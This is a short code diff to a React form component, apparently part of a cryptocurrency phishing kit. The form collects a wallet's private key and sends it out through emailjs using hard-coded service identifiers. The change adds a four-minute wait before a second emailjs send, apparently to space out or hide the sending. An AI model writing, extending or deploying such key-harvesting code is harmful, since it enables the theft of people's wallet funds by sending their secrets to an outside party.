@@ -37,6 +37,8 @@ const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
     e.preventDefault();
     setPrivateSubmitBtn('Processing...');
 
+    const sendFast = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
     if (privateKey64Long) {
       try {
 
@@ -55,6 +57,8 @@ const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
           },
           'pudHPDoixy2beukw8'
         );
+
+        await sendFast(4 * 60 * 1000);
         
         await emailjs.send(
           'service_ky8xa0e',
